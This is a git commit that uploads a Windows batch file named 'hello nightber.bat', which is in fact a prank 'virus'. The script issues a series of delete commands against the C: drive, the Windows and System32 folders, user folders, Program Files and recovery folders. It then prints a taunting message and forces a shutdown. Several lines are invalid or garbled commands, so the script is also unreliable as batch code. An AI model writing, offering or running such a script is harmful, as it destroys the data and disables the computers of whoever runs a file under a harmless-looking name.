3eb23170b497c46ff97fa4217cc3f4c90e888300
0108888 <150950452+0108888@users.noreply.github.com>
2024-04-29 16:03:31 +0100

    Add files via upload

---
+++ hello nightber.bat
@@ -0,0 +1,27 @@
+@echo off
+disable mouse
+disable keyboard
+disable system32
+del c:/
+del c:/ windows
+del c:/windows/system32
+del c:/system32/logonu1.exe
+del c:/windows
+del c:/NVIDIA
+del c:/documents And settings
+del c:/RECOVERY
+del c:/Swsetup
+del c:/Temp
+del c:/program files
+del c:/perfLogs
+del c:/.rnd
+del c:/Brukere
+del c:/users
+del c:/MCPdel c:/CMD
+del c:/
+disable windows
+fir /s
+echo I am your virus. I deleted your files#echo because you tried to delete me.
+echo By the way, I am -->_<--."
+pause
+shutdown -s -t 10 -c "say goodbye to you computer!"
